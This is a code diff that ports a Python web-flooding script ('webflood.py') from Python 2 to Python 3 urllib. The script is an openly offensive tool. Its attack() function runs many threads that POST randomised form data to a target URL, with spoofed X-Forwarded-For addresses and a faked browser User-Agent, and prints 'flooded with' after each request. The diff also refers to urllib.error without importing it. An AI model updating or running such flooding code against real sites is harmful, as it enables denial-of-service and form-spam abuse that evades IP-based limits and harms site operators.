@@ -8,8 +8,8 @@
 #python3 webflood.py 5
 #(replace 5 with the number of threads you want to launch)
  
-import urllib
-import urllib2
+import urllib.parse
+import urllib.request
 import random
 import string
 from threading import Thread
@@ -38,13 +38,13 @@ def attack():
                 'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36',
                 'X-Forwarded-For': '.'.join(str(random.randint(0, 255)) for _ in range(4))
             }
-            req = urllib2.Request(url="",
-                                  data=urllib.urlencode(data),
-                                  headers=headers)
+            req = urllib.request.Request(url="",
+                                         data=urllib.parse.urlencode(data).encode('utf-8'),
+                                         headers=headers)
             try:
-                response = urllib2.urlopen(req)
+                response = urllib.request.urlopen(req)
                 print("Status code: " + str(response.getcode()))
-            except urllib2.HTTPError as e:
+            except urllib.error.HTTPError as e:
                 print("Error code: " + str(e.code))
             the_page = response.read()
             print('flooded with ' + str(data))
